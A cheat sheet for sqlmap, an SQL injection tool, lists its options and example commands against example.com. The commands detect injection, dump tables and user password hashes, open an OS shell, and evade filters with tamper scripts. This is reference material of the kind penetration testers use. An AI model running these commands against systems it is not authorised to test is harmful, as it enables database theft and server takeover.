# sqlmap — Automatic SQL Injection

Detect and exploit SQL injection flaws, then take over database servers.

```bash
sqlmap -u "http://example.com/page?id=1"
```

## Options

| Command | Description |
| :--- | :--- |
| `-u <url>` | Target URL |
| `-p id` | Test a specific parameter |
| `--data "id=1"` | POST data to test |
| `-r request.txt` | Load a raw HTTP request (from Burp/ZAP) |
| `--cookie "..."` | Send cookies (for authenticated pages) |
| `--level 5` | Test thoroughness (1-5) |
| `--risk 3` | Risk of payloads (1-3) |
| `--batch` | Never ask for input, use defaults |
| `--dbms=mysql` | Force the backend DBMS |
| `--random-agent` | Use a random User-Agent |
| `--proxy http://127.0.0.1:8080` | Route through a proxy |
| `--tamper=space2comment` | Apply evasion tamper scripts |

## Enumeration & Dumping

| Command | Description |
| :--- | :--- |
| `--dbs` | List databases |
| `-D dbname --tables` | List tables in a database |
| `-D dbname -T users --columns` | List columns of a table |
| `-D dbname -T users --dump` | Dump table contents |
| `--dump-all` | Dump everything |
| `--current-user` `--current-db` | Show current DB user / database |
| `--passwords` | Enumerate & crack DB user password hashes |
| `--os-shell` | Try to get an interactive OS shell |
| `--sql-shell` | Get an interactive SQL shell |

## Examples

```bash
# 1. Test a GET parameter, non-interactive
sqlmap -u "http://example.com/item?id=1" --batch

# 2. Test a POST request
sqlmap -u "http://example.com/login" --data "user=admin&pass=x"

# 3. Replay a captured request and enumerate databases
sqlmap -r request.txt --dbs --batch

# 4. Dump a specific table
sqlmap -u "http://example.com/item?id=1" -D shop -T users --dump

# 5. Deep scan with evasion through a proxy
sqlmap -u "http://example.com/item?id=1" --level 5 --risk 3 \
  --random-agent --tamper=space2comment
```

## Installation

```bash
brew install sqlmap

# Or from source
git clone https://github.com/sqlmapproject/sqlmap
python sqlmap/sqlmap.py -u "http://example.com/?id=1"
```
